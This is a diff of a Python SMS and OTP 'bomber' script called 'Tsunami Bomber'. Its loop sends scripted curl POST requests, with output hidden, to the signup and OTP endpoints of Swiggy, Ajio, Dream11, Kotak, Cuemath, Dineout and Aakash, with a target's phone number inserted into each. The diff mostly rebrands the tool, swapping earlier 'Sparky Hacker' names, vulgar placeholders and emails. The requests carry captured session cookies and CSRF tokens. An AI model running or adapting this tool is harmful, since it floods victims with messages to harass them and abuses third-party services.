"cookie:AWSALB=72X09cOjNjRUWWCFBkPfC4pzIxNDaf7UOluGPLojxXMlbny21JQrAgsBxD2kPx47rLJscBQ4+YLSLds2TCR7ltut261umPg7FUh1IBCt4tCi8kjCQIzPem5vmWxd" -d '&mobileval='''
             + target +
-            '''&otp=6230' "https://digital.aakash.ac.in/mkt-signup-otp-verify" --output sparky  > /dev/null 2>&1
+            '''&otp=6230' "https://digital.aakash.ac.in/mkt-signup-otp-verify" --output Logfile  > /dev/null 2>&1
                         ''')
         times = times + 1
 
         os.popen(
             '''
-                        curl -X POST -H "Host:www.swiggy.com" -H "content-length:172" -H "origin:https://www.swiggy.com" -H "__fetch_req__:true" -H "user-agent:Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5" -H "content-type:application/json" -H "accept:*/*" -H "referer:https://www.swiggy.com/auth/register" -H "accept-encoding:gzip, deflate" -H "accept-language:en-US" -H "cookie:_gid=GA1.2.1062400057.1600721785" -H "cookie:_ga=GA1.2.933128931.1600721785" -H "cookie:__cf_bm=49fd023d2de2dcc513416b86f346ef849ff78965-1600721801-1800-AffpoGFA9y2uIXnuTnsdWLAvACoa7Yoi0Atoa5go3TwGhcCaro5zMawagaz/3h6h+magOo4GhTCbVieffp6NXM0=" -H "cookie:_device_id=becf3981-4f8f-41e0-b3dd-3188b909ae13" -H "cookie:afUserId=e5d4b7d4-1473-4953-8dd8-7db0c6a7c614-p" -H "cookie:__cfduid=d4953510590027eff3cccf0ec29bd40121600721785" -H "cookie:AMP_TOKEN=%24NOT_FOUND" -H "cookie:_gcl_au=1.1.1262278937.1600721784" -H "cookie:_sid=p6q1ed4e-90a6-4c83-b56b-f1af071a0b17" -H "cookie:_guest_tid=ac1bb2e7-f54c-45cb-8a69-5ebd7b6706f5" -H "cookie:__SW=bcBBQ8mXgTrUPE0YKx8A44dDIVVH5UoB" -d '{"name":"dbdbdbd","email":"sparxmr0@gmail.com","password":"sndndndbdj283jsbsbs","referral_code":"","mobile":"'''
+                        curl -X POST -H "Host:www.swiggy.com" -H "content-length:172" -H "origin:https://www.swiggy.com" -H "__fetch_req__:true" -H "user-agent:Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5" -H "content-type:application/json" -H "accept:*/*" -H "referer:https://www.swiggy.com/auth/register" -H "accept-encoding:gzip, deflate" -H "accept-language:en-US" -H "cookie:_gid=GA1.2.1062400057.1600721785" -H "cookie:_ga=GA1.2.933128931.1600721785" -H "cookie:__cf_bm=49fd023d2de2dcc513416b86f346ef849ff78965-1600721801-1800-AffpoGFA9y2uIXnuTnsdWLAvACoa7Yoi0Atoa5go3TwGhcCaro5zMawagaz/3h6h+magOo4GhTCbVieffp6NXM0=" -H "cookie:_device_id=becf3981-4f8f-41e0-b3dd-3188b909ae13" -H "cookie:afUserId=e5d4b7d4-1473-4953-8dd8-7db0c6a7c614-p" -H "cookie:__cfduid=d4953510590027eff3cccf0ec29bd40121600721785" -H "cookie:AMP_TOKEN=%24NOT_FOUND" -H "cookie:_gcl_au=1.1.1262278937.1600721784" -H "cookie:_sid=p6q1ed4e-90a6-4c83-b56b-f1af071a0b17" -H "cookie:_guest_tid=ac1bb2e7-f54c-45cb-8a69-5ebd7b6706f5" -H "cookie:__SW=bcBBQ8mXgTrUPE0YKx8A44dDIVVH5UoB" -d '{"name":"dbdbdbd","email":"tsunami@gmail.com","password":"sndndndbdj283jsbsbs","referral_code":"","mobile":"'''
             + target +
-            '''","_csrf":"jK7JY3E9u8xJ-1Q_DUwsGnPDhccbB4rGz0dKIbfk"}' "https://www.swiggy.com/mapi/auth/signup" --output sparky  > /dev/null 2>&1
+            '''","_csrf":"jK7JY3E9u8xJ-1Q_DUwsGnPDhccbB4rGz0dKIbfk"}' "https://www.swiggy.com/mapi/auth/signup" --output Logfile  > /dev/null 2>&1
                         ''')
         times = times + 1
 
@@ -234,7 +244,7 @@ def infinite(target, color, msgs):
             '''
                         curl -X POST -H "Host:www.limeroad.com" -H "content-length:101" -H "origin:https://www.limeroad.com" -H "user-agent:Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5" -H "content-type:application/x-www-form-urlencoded" -H "accept:*/*" -H "referer:https://www.limeroad.com/feed_nup_v1?feed_kyc=true&gender=Men" -H "accept-encoding:gzip, deflate" -H "accept-language:en-US" -H "cookie:locale=hi" -H "cookie:lrVr=v2" -H "cookie:AWSALB=Aum/5hkqPnGDduYS/RwPuH4NMlb8KsEWzmAcaduTtaaRrPdqiZ76xnnTdzuLPupgFMK3xXY3uJH4GgYj9V5wN9MLnEwGPNy2LdlaCycYQQSBcBOfEaMI5VsVlx3/" -H "cookie:testCookie=v2" -H "cookie:deviceHeight=632" -H "cookie:deviceWidth=360" -H "cookie:gender=M" -H "cookie:duid=e9e7b3ffb31375ea608dc18f9da4e98c" -H "cookie:_session_id=e2b24a146c5a10f5f7abf753786a12d9" -H "cookie:nH=1" -H "cookie:newCssOpt=v1" -H "cookie:_ruid=9a0ef1da-cd58-4e5e-a326-09c0e757be5a" -H "cookie:jr_token=true%3F%3F7b529cb3-c933-43cf-9ec1-360139c2d56e%3F%3Fjoulroad%3F%3F8fe37c95-270b-4a92-81f9-2a8d684cac66%3F%3FGuest" -H "cookie:a_n_u_a=1" -d 'utf8=%E2%9C%93&authenticity_token=6686Dtpby7plpvjXr5%2Fe8oyPdiQ3Weta9Y9ydzSRP64%3D&user_id='''
             + target +
-            '''' "https://www.limeroad.com/auth/get_uuid_v2?ajax=true&ret=https://www.limeroad.com/myaccount/orders?ajax=true&mobileOnly=false&doAction=" --output sparky > /dev/null 2>&1
+            '''' "https://www.limeroad.com/auth/get_uuid_v2?ajax=true&ret=https://www.limeroad.com/myaccount/orders?ajax=true&mobileOnly=false&doAction=" --output Logfile > /dev/null 2>&1
                         ''')
         times = times + 1
 
@@ -246,9 +256,9 @@ def infinite(target, color, msgs):
                         ''')
         times = times + 1
 
-        cmd3 = '''curl -X POST -H "Host:login.web.ajio.com" -H "Connection:keep-alive" -H "Content-Length:36" -H "accept:application/json" -H "Origin:https://www.ajio.com" -H "User-Agent:Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5" -H "content-type:application/json" -H "Referer:https://www.ajio.com/signup?referrer=/my-account/" -H "Accept-Encoding:gzip, deflate" -H "Accept-Language:en-US" -H "Cookie:FirstPage=Tue Sep 22 2020 10:56:22 GMT+0530 (IST); cdigiMrkt=utm_source%3A%7Cutm_medium%3A%7Cdevice%3Amobile%7Cexpires%3AThu%2C%2022%20Oct%202020%2005%3A26%3A29%20GMT%7C; _fp=3bb177293be711354c411930e1c5a87b; _ga=GA1.2.741522456.1600752380; _gid=GA1.2.1110829528.1600752380; _gac_UA-68002030-1=1.1600752389.EAIaIQobChMI6MWt_YL86wIVQZ_CCh13KwoHEAQYDiABEgI94vD_BwE; V=201; TS01fe4249=01ef61aed0002976a57b4d1bb8abc432bc6065f29099a472ea7f37800ed6f0344eaca4aeb95e747321704d1b608a74c8f71e11dd2f0a7ed84c45017f54a62bb31323cfbeb7; uI=9519874704; TS017df282=01ef61aed045c87a16cd6397e020723e2c6b61f0afebf7d3ac273bcf3b708d4fd2ce15171afb2a7cac64409db30eb76abe89effe8a046fd375ed2169ab7af96233a02f1c21; WZRK_G=ab70e1057e5e479ba540650bf8aa228a; WZRK_S_48K-4R4-K84Z=%7B%22p%22%3A6%2C%22s%22%3A1600752384%2C%22t%22%3A1600752586%7D; sessionStatus=true|undefined; cto_bundle=m71QbF9GWENqWWJaJTJCVWtlNUFVNzAydUNTYnk4VXkzYm9NdzdkbTJQeUEzWWlzQUxtMiUyQnVYWjVWaFlXT2g1bDVlNXNhdUVROTdBR2ZNb2JwJTJCZHhZRUs4SEolMkZRQVVMemtkdWo2QzNyV09wVVFrVDZsYU1DYTAyMk1pdlhLeWM0T3hWQmdrcjNaNjNqcUFTdGhwZ1Z6cWZwQVQyUSUzRCUzRA; _fbp=fb.1.1600752385516.1674349488" -d '{"emailId":"sparkykalund@gmail.com"}' "https://login.web.ajio.com/api/auth/accountCheck" > /dev/null 2>&1 '''
+        cmd3 = '''curl -X POST -H "Host:login.web.ajio.com" -H "Connection:keep-alive" -H "Content-Length:36" -H "accept:application/json" -H "Origin:https://www.ajio.com" -H "User-Agent:Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5" -H "content-type:application/json" -H "Referer:https://www.ajio.com/signup?referrer=/my-account/" -H "Accept-Encoding:gzip, deflate" -H "Accept-Language:en-US" -H "Cookie:FirstPage=Tue Sep 22 2020 10:56:22 GMT+0530 (IST); cdigiMrkt=utm_source%3A%7Cutm_medium%3A%7Cdevice%3Amobile%7Cexpires%3AThu%2C%2022%20Oct%202020%2005%3A26%3A29%20GMT%7C; _fp=3bb177293be711354c411930e1c5a87b; _ga=GA1.2.741522456.1600752380; _gid=GA1.2.1110829528.1600752380; _gac_UA-68002030-1=1.1600752389.EAIaIQobChMI6MWt_YL86wIVQZ_CCh13KwoHEAQYDiABEgI94vD_BwE; V=201; TS01fe4249=01ef61aed0002976a57b4d1bb8abc432bc6065f29099a472ea7f37800ed6f0344eaca4aeb95e747321704d1b608a74c8f71e11dd2f0a7ed84c45017f54a62bb31323cfbeb7; uI=9519874704; TS017df282=01ef61aed045c87a16cd6397e020723e2c6b61f0afebf7d3ac273bcf3b708d4fd2ce15171afb2a7cac64409db30eb76abe89effe8a046fd375ed2169ab7af96233a02f1c21; WZRK_G=ab70e1057e5e479ba540650bf8aa228a; WZRK_S_48K-4R4-K84Z=%7B%22p%22%3A6%2C%22s%22%3A1600752384%2C%22t%22%3A1600752586%7D; sessionStatus=true|undefined; cto_bundle=m71QbF9GWENqWWJaJTJCVWtlNUFVNzAydUNTYnk4VXkzYm9NdzdkbTJQeUEzWWlzQUxtMiUyQnVYWjVWaFlXT2g1bDVlNXNhdUVROTdBR2ZNb2JwJTJCZHhZRUs4SEolMkZRQVVMemtkdWo2QzNyV09wVVFrVDZsYU1DYTAyMk1pdlhLeWM0T3hWQmdrcjNaNjNqcUFTdGhwZ1Z6cWZwQVQyUSUzRCUzRA; _fbp=fb.1.1600752385516.1674349488" -d '{"emailId":"tsunami@gmail.com"}' "https://login.web.ajio.com/api/auth/accountCheck" > /dev/null 2>&1 '''
         times = times + 1
-        cmd4 = '''curl -X POST -H "Host:login.web.ajio.com" -H "Connection:keep-alive" -H "Content-Length:158" -H "accept:application/json" -H "Origin:https://www.ajio.com" -H "User-Agent:Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5" -H "content-type:application/json" -H "Referer:https://www.ajio.com/signup?referrer=/my-account/" -H "Accept-Encoding:gzip, deflate" -H "Accept-Language:en-US" -d '{"firstName":"Randi Baaz","login":"sparkykalund@gmail.com","password":"kd34646@3131nxnxn","genderType":"","mobileNumber":"''' + target + '''","requestType":"SENDOTP"}' "https://login.web.ajio.com/api/auth/signupSendOTP" > /dev/null 2>&1 '''
+        cmd4 = '''curl -X POST -H "Host:login.web.ajio.com" -H "Connection:keep-alive" -H "Content-Length:158" -H "accept:application/json" -H "Origin:https://www.ajio.com" -H "User-Agent:Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5" -H "content-type:application/json" -H "Referer:https://www.ajio.com/signup?referrer=/my-account/" -H "Accept-Encoding:gzip, deflate" -H "Accept-Language:en-US" -d '{"firstName":"Tsunami Bomber","login":"tsunami@gmail.com","password":"kd34646@3131nxnxn","genderType":"","mobileNumber":"''' + target + '''","requestType":"SENDOTP"}' "https://login.web.ajio.com/api/auth/signupSendOTP" > /dev/null 2>&1 '''
         os.popen(cmd3)
         os.popen(cmd4)
         times = times + 1
@@ -257,7 +267,7 @@ def infinite(target, color, msgs):
             '''
                         curl -X POST -H "Host:digital.aakash.ac.in" -H "content-length:21" -H "accept:*/*" -H "origin:https://digital.aakash.ac.in" -H "x-requested-with:XMLHttpRequest" -H "user-agent:Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5" -H "content-type:application/x-www-form-urlencoded; charset=UTF-8" -H "referer:https://digital.aakash.ac.in/user/register" -H "accept-encoding:gzip, deflate" -H "accept-language:en-US" -H "cookie:__zlcmid=10IjS9ldmuaIwof" -H "cookie:_co_session_active=1" -H "cookie:_gac_UA-132222061-1=1.1600720006.EAIaIQobChMIvouozor76wIVMcEWBR1y6QeAEAAYASAAEgKbQPD_BwE" -H "cookie:_gid=GA1.3.1265004790.1600719997" -H "cookie:_ga=GA1.3.1759859626.1600719997" -H "cookie:_fbp=fb.2.1600720004859.138019050" -H "cookie:_hjIncludedInSessionSample=1" -H "cookie:_gac_UA-132222061-1=1.1600720006.EAIaIQobChMIvouozor76wIVMcEWBR1y6QeAEAAYASAAEgKbQPD_BwE" -H "cookie:_gid=GA1.4.1265004790.1600719997" -H "cookie:_ga=GA1.4.1759859626.1600719997" -H "cookie:AWSALB=dc39iVQJB7z5bxbK+8AZ/kOwW29goA5mAejiW5ecDoRFe5kGjNfw2I7KdE72gvy0JdR+T98HU7sz/9SX2sS7zbjR5mfmkhdngzxHGshtH9XM94QFW5L0uL+aIzpf" -H "cookie:cto_bundle=wRx-il9KZ1ZVUFBBUEdtaDhUbExxZnBYcTJTOXZXd050Z0E3TnElMkZqNyUyRlZ3VGRZcGNuZjJJUDZ4MFlyZk9waTdsQjJLMUFtWDlpdG1XWG5iT1hZSU9VeGslMkJRQ21uJTJCaWplbW94cEZaaDZpZ3FMMnBKUmV3OFN4d1h6SVo3clQ1VjFQOEtQS2RLV2U0ajBPMnc1NnJyMUwlMkYxSkVnJTNEJTNE" -H "cookie:_uetvid=d753b1ed7dd67a59bebc401d8ab4515b" -H "cookie:_uetsid=946c3602e20e8980818f215fc8fac48f" -H "cookie:_gcl_au=1.1.2026770221.1600758975" -H "cookie:wh-widget-cookie=1" -H "cookie:_hjid=30609baa-1084-4a2e-998c-54e41f4084fd" -H "cookie:_hjTLDTest=1" -d '&mobileval='''
             + target +
-            '''' "https://digital.aakash.ac.in/signup-otp-verify" --output sparky  > /dev/null 2>&1
+            '''' "https://digital.aakash.ac.in/signup-otp-verify" --output Logfile  > /dev/null 2>&1
                         ''')
         times = times + 1
 
@@ -357,9 +367,9 @@ def infinite(target, color, msgs):
         times = times + 1
 
         os.popen(
-            '''curl -X POST -H "Host:www.dream11.com" -H "content-length:316" -H "accept:*/*" -H "device:pwa" -H "x-csrf:fb1f1947-4547-392d-9a28-a9de30d9e766" -H "save-data:on" -H "user-agent:Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36" -H "content-type:application/json" -H "origin:https://www.dream11.com" -H "sec-fetch-site:same-origin" -H "sec-fetch-mode:cors" -H "sec-fetch-dest:empty" -H "referer:https://www.dream11.com/register?testcode=affpwa2&utm_source=VcomIndWeb&utm_medium=cpr&utm_campaign=98885&utm_content=20200919" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-US,en;q=0.9,hi;q=0.8" -H "cookie:WZRK_S_W4R-49K-494Z=%7B%22p%22%3A1%2C%22s%22%3A1602759175%2C%22t%22%3A1602759175%7D" -H "cookie:dh_user_id=91c4edf0-0ed4-11eb-9f02-755b4004c50d" -H "cookie:WZRK_G=dc2112f4850746a0b8b47c233471fe4a" -H "cookie:ajs_anonymous_id=%2218835b7c-2e60-48c2-a6c4-79dc7e7c169a%22" -H "cookie:G_ENABLED_IDPS=google" -H "cookie:__csrf=fb1f1947-4547-392d-9a28-a9de30d9e766" -d '{"query":"mutation register( $email: String! $mobileNumber: String! $password: String! $site: String) { registerSendOTPMutation( email: $email mobileNumber: $mobileNumber password: $password site: $site ) { message }}","variables":{"email":"sparxmr0@gmail.com","mobileNumber":"'''
+            '''curl -X POST -H "Host:www.dream11.com" -H "content-length:316" -H "accept:*/*" -H "device:pwa" -H "x-csrf:fb1f1947-4547-392d-9a28-a9de30d9e766" -H "save-data:on" -H "user-agent:Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36" -H "content-type:application/json" -H "origin:https://www.dream11.com" -H "sec-fetch-site:same-origin" -H "sec-fetch-mode:cors" -H "sec-fetch-dest:empty" -H "referer:https://www.dream11.com/register?testcode=affpwa2&utm_source=VcomIndWeb&utm_medium=cpr&utm_campaign=98885&utm_content=20200919" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-US,en;q=0.9,hi;q=0.8" -H "cookie:WZRK_S_W4R-49K-494Z=%7B%22p%22%3A1%2C%22s%22%3A1602759175%2C%22t%22%3A1602759175%7D" -H "cookie:dh_user_id=91c4edf0-0ed4-11eb-9f02-755b4004c50d" -H "cookie:WZRK_G=dc2112f4850746a0b8b47c233471fe4a" -H "cookie:ajs_anonymous_id=%2218835b7c-2e60-48c2-a6c4-79dc7e7c169a%22" -H "cookie:G_ENABLED_IDPS=google" -H "cookie:__csrf=fb1f1947-4547-392d-9a28-a9de30d9e766" -d '{"query":"mutation register( $email: String! $mobileNumber: String! $password: String! $site: String) { registerSendOTPMutation( email: $email mobileNumber: $mobileNumber password: $password site: $site ) { message }}","variables":{"email":"tsunami@gmail.com","mobileNumber":"'''
             + target +
-            '''","password":"Lund@Bur+Jhat"}}' "https://www.dream11.com/graphql/mutation/pwa/register" > /dev/null 2>&1'''
+            '''","password":"tsunami@123astronomia"}}' "https://www.dream11.com/graphql/mutation/pwa/register" > /dev/null 2>&1'''
         )
         times = times + 1
 
@@ -371,7 +381,7 @@ def infinite(target, color, msgs):
         times = times + 1
 
         os.popen(
-            '''curl -X POST -H "Host:www.kotak.com" -H "Connection:keep-alive" -H "Content-Length:143" -H "Accept:application/json, text/javascript, */*; q=0.01" -H "X-Requested-With:XMLHttpRequest" -H "User-Agent:Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36" -H "Content-Type:application/x-www-form-urlencoded; charset=UTF-8" -H "Origin:https://www.kotak.com" -H "Sec-Fetch-Site:same-origin" -H "Sec-Fetch-Mode:cors" -H "Sec-Fetch-Dest:empty" -H "Referer:https://www.kotak.com/811-savingsaccount-ZeroBalanceAccount/811/vkyc-home.action?source=VKYCIL&banner=ILVKYClaunch&pubild=VKYClaunchmailer_1696_" -H "Accept-Encoding:gzip, deflate, br" -H "Accept-Language:en-US,en;q=0.9,hi;q=0.8" -H "Cookie:JSESSIONID=0000P-ep34ciOrPvp1ymnR48y_E:-1; NSC_JO0ork0tdyr4qd4blzcfyrcuwai1eb0=ffffffff09023da045525d5f4f58455e445a4a42150c; _gcl_au=1.1.1243881610.1603857484; WZRK_G=7ce1a924d4324651b5060fb3eb9c1e87; WZRK_S_W4W-5K7-K75Z=%7B%22p%22%3A1%2C%22s%22%3A1603857484%2C%22t%22%3A1603857484%7D; _ga=GA1.2.494540412.1603857484; _gid=GA1.2.844884659.1603857484; _uetsid=c7f02f4018d111ebb67e1da217874a38; _uetvid=c7f28de018d111eb8cbb5dd28b9f9334; _fbp=fb.1.1603857484947.174573870; _dc_gtm_UA-4203568-53=1; _gat_UA-4203568-53=1; _gat_UA-4203568-59=1; _hjTLDTest=1; _hjid=a83b36d7-433b-41f6-8ede-161af7e27204; _hjAbsoluteSessionInProgress=0; _gaexp=GAX1.2.kNrNERU2Qx2igfIj9Nwmtw.18644.1; _gat_gtag_UA_4203568_53=1" -d 'cust_full_name=Sparky+Hacker&cust_email=sparkykalund%40gmail.com&cust_mobile='''
+            '''curl -X POST -H "Host:www.kotak.com" -H "Connection:keep-alive" -H "Content-Length:143" -H "Accept:application/json, text/javascript, */*; q=0.01" -H "X-Requested-With:XMLHttpRequest" -H "User-Agent:Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36" -H "Content-Type:application/x-www-form-urlencoded; charset=UTF-8" -H "Origin:https://www.kotak.com" -H "Sec-Fetch-Site:same-origin" -H "Sec-Fetch-Mode:cors" -H "Sec-Fetch-Dest:empty" -H "Referer:https://www.kotak.com/811-savingsaccount-ZeroBalanceAccount/811/vkyc-home.action?source=VKYCIL&banner=ILVKYClaunch&pubild=VKYClaunchmailer_1696_" -H "Accept-Encoding:gzip, deflate, br" -H "Accept-Language:en-US,en;q=0.9,hi;q=0.8" -H "Cookie:JSESSIONID=0000P-ep34ciOrPvp1ymnR48y_E:-1; NSC_JO0ork0tdyr4qd4blzcfyrcuwai1eb0=ffffffff09023da045525d5f4f58455e445a4a42150c; _gcl_au=1.1.1243881610.1603857484; WZRK_G=7ce1a924d4324651b5060fb3eb9c1e87; WZRK_S_W4W-5K7-K75Z=%7B%22p%22%3A1%2C%22s%22%3A1603857484%2C%22t%22%3A1603857484%7D; _ga=GA1.2.494540412.1603857484; _gid=GA1.2.844884659.1603857484; _uetsid=c7f02f4018d111ebb67e1da217874a38; _uetvid=c7f28de018d111eb8cbb5dd28b9f9334; _fbp=fb.1.1603857484947.174573870; _dc_gtm_UA-4203568-53=1; _gat_UA-4203568-53=1; _gat_UA-4203568-59=1; _hjTLDTest=1; _hjid=a83b36d7-433b-41f6-8ede-161af7e27204; _hjAbsoluteSessionInProgress=0; _gaexp=GAX1.2.kNrNERU2Qx2igfIj9Nwmtw.18644.1; _gat_gtag_UA_4203568_53=1" -d 'cust_full_name=Tsunami+Bomber&cust_email=tsunami%40gmail.com&cust_mobile='''
             + target +
             '''&cust_political_disclaimer=Yes&cust_fatca_disclaimer=Yes' "https://www.kotak.com/811-savingsaccount-ZeroBalanceAccount/811/save-home-mobile.action?source=VKYCIL&banner=ILVKYClaunch&pubild=VKYClaunchmailer_1696_&SWNToken=1603857481489&flw=vkyc" > /dev/null 2>&1'''
         )
@@ -386,7 +396,7 @@ def infinite(target, color, msgs):
             '''curl -X POST -H "Host:www.cuemath.com" -H "content-length:269" -H "user-agent:Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36" -H "content-type:application/JSON" -H "accept:*/*" -H "origin:https://www.cuemath.com" -H "sec-fetch-site:same-origin" -H "sec-fetch-mode:cors" -H "sec-fetch-dest:empty" -H "referer:https://www.cuemath.com/parent/signup/?" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-US,en;q=0.9,hi;q=0.8" -H "cookie:cookieconsent_status=dismiss" -H "cookie:_CEFT=Q%3D%3D%3D" -H "cookie:_fbp=fb.1.1603882875848.1161506818" -H "cookie:_uetvid=e5a9c120190c11eba48bfd200f8a14a3" -H "cookie:_uetsid=e5a5ac70190c11ebbbd2895d4b869731" -H "cookie:AF_BANNERS_SESSION_ID=1603882874676" -H "cookie:_dc_gtm_UA-75184559-1=1" -H "cookie:cue_gacid=543040074.1603882874" -H "cookie:_gid=GA1.2.310046842.1603882874" -H "cookie:_ga=GA1.2.543040074.1603882874" -H "cookie:_gcl_au=1.1.109511992.1603882873" -H "cookie:landing_page=%2F" -H "cookie:referrer=https%3A%2F%2Fwww.google.com%2F" -H "cookie:cue_country_code=j%3Anull" -H "cookie:__cfduid=dbfb990bb3a6f23fba926d9894a45d9351603882867" -d '{"intl_mobile":{"phone":"'''
             + target + '''"},"notify":["notify_on_whatsapp"],"phone":"''' +
             target +
-            '''","email":"sparkykadhkdkdjdlund@gmail.com","full_name":"Sparky Hacker","timezone":"Asia/Calcutta","notify_through":"notify_on_whatsapp","form_fields":"full_name,email,intl_mobile"}' "https://www.cuemath.com/api/v4/parents/" > /dev/null 2>&1'''
+            '''","email":"tsunami@gmail.com","full_name":"Tsunami Bomber","timezone":"Asia/Calcutta","notify_through":"notify_on_whatsapp","form_fields":"full_name,email,intl_mobile"}' "https://www.cuemath.com/api/v4/parents/" > /dev/null 2>&1'''
         )
         times = times + 1
 
@@ -477,7 +487,7 @@ def infinite(target, color, msgs):
 
         os.popen(
             '''
-                        curl -X POST -H "Host:www.dineout.co.in" -H "content-length:65" -H "accept:application/json, text/javascript, /; q=0.01" -H "x-requested-with:XMLHttpRequest" -H "user-agent:Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36" -H "content-type:application/x-www-form-urlencoded; charset=UTF-8" -H "origin:https://www.dineout.co.in" -H "sec-fetch-site:same-origin" -H "sec-fetch-mode:cors" -H "sec-fetch-dest:empty" -H "referer:https://www.dineout.co.in/non-veg-special-restaurants-near-me" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-US,en;q=0.9,hi;q=0.8" -H "cookie:pwa=0" -H "cookie:WZRK_S_48K-44K-5R5Z=%7B%22p%22%3A1%2C%22s%22%3A1604561879%2C%22t%22%3A1604561879%7D" -H "cookie:WZRK_G=c0a4edbd231e4af5975c7c0013b03754" -H "cookie:gaClientId=403939189.1604561878" -H "cookie:_gat=1" -H "cookie:G_ENABLED_IDPS=google" -H "cookie:_fbp=fb.2.1604561878472.1759911387" -H "cookie:_col_uuid=23b8f026-f1d4-42ee-9431-9ddae2926e46-62no" -H "cookie:_gid=GA1.3.529280843.1604561878" -H "cookie:_ga=GA1.3.403939189.1604561878" -H "cookie:firstUser=2" -H "cookie:connect.sid=s%3ANQCFBDI97YYDwUIsGGIxhtr2ROMdpU9R.wov1d5tZLKCYTQMvAeauuc9FMD6qiPP4qXZPvZHjXj8" -H "cookie:city_id=0" -H "cookie:city_name=Delhi" -H "cookie:firstVisit=1" -H "cookie:countly_webapp_uid=NQCFBDI97YYDwUIsGGIxhtr2ROMdpU9R" -d 'name=Sparky+Hacker&email=sparykalund%40gmail.com&phone='''
+                        curl -X POST -H "Host:www.dineout.co.in" -H "content-length:65" -H "accept:application/json, text/javascript, /; q=0.01" -H "x-requested-with:XMLHttpRequest" -H "user-agent:Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36" -H "content-type:application/x-www-form-urlencoded; charset=UTF-8" -H "origin:https://www.dineout.co.in" -H "sec-fetch-site:same-origin" -H "sec-fetch-mode:cors" -H "sec-fetch-dest:empty" -H "referer:https://www.dineout.co.in/non-veg-special-restaurants-near-me" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-US,en;q=0.9,hi;q=0.8" -H "cookie:pwa=0" -H "cookie:WZRK_S_48K-44K-5R5Z=%7B%22p%22%3A1%2C%22s%22%3A1604561879%2C%22t%22%3A1604561879%7D" -H "cookie:WZRK_G=c0a4edbd231e4af5975c7c0013b03754" -H "cookie:gaClientId=403939189.1604561878" -H "cookie:_gat=1" -H "cookie:G_ENABLED_IDPS=google" -H "cookie:_fbp=fb.2.1604561878472.1759911387" -H "cookie:_col_uuid=23b8f026-f1d4-42ee-9431-9ddae2926e46-62no" -H "cookie:_gid=GA1.3.529280843.1604561878" -H "cookie:_ga=GA1.3.403939189.1604561878" -H "cookie:firstUser=2" -H "cookie:connect.sid=s%3ANQCFBDI97YYDwUIsGGIxhtr2ROMdpU9R.wov1d5tZLKCYTQMvAeauuc9FMD6qiPP4qXZPvZHjXj8" -H "cookie:city_id=0" -H "cookie:city_name=Delhi" -H "cookie:firstVisit=1" -H "cookie:countly_webapp_uid=NQCFBDI97YYDwUIsGGIxhtr2ROMdpU9R" -d 'name=Tsunami+Bomber&email=tsunami%40gmail.com&phone='''
             + target +
             '''' "https://www.dineout.co.in/xhrajaxrequest/user_signup" > /dev/null 2>&1
                         ''')
@@ -499,7 +509,7 @@ def infinite(target, color, msgs):
 
         os.popen(
             '''
